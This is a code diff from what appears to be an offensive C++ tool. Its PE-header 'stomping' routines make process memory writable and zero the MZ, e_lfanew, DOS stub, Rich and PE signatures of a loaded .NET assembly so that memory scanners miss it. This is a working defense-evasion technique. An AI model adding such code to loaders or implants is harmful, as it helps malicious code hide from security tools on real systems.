@@ -133,7 +133,7 @@ namespace PEModuleHelper {
 
 	void StompPEHeaders(HANDLE hProcess) {
 
-		//PE DOS HEADER SIG
+		//PE DOS HEADER
 		LPCSTR _pattern = "\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65";
 
 		printf("[+]: Obtaining a handle of the current process: %d\n", (INT_PTR)hProcess);
@@ -163,7 +163,6 @@ namespace PEModuleHelper {
 	void StompPEDOSHeader(LPSTR ntheaderAddr)
 	{
 
-		LPSTR olNtH = ntheaderAddr;
 		LPVOID nthAddr = (LPVOID)ntheaderAddr;
 		NTSTATUS status;
 		SIZE_T page = 4096;
@@ -177,17 +176,22 @@ namespace PEModuleHelper {
 			return;
 		}
 
-		//zeroing out 224 bytes of the PE DOS Header leads to crashing the loaded .net assembly, I'm only patching specific PE DOS HEADER signatured offsets and byte sequences as a workaround.
-		SIZE_T Size = 2;
-
 		status = NtProtectVirtualMemory(NtGetCurrentProcess(), &nthAddr, &page, PAGE_READWRITE, &Protect);
 		if (!NT_SUCCESS(status)) {
 			//printf("\t\t[!]: Error NtProtectVirtualMemory\n");
 			return;
 		}
 
-		RtlZeroMemory((PVOID)olNtH, Size);
-		RtlZeroMemory((PVOID)(olNtH + Size + 75), Size + 37);
+		//MZ
+		RtlZeroMemory((PVOID)ntheaderAddr, 2);
+		//e_lfanew
+		RtlZeroMemory((PVOID)(ntheaderAddr+60), 4);
+		//DOS
+		RtlZeroMemory((PVOID)(ntheaderAddr+64), 66);
+		//Rich
+		RtlZeroMemory((PVOID)(ntheaderAddr + 256), 4);
+		//PE
+		RtlZeroMemory((PVOID)(ntheaderAddr + 288), 2);
 
 		status = NtProtectVirtualMemory(NtGetCurrentProcess(), &nthAddr, &page, Protect, &Protect);
 		if (!NT_SUCCESS(status)) {
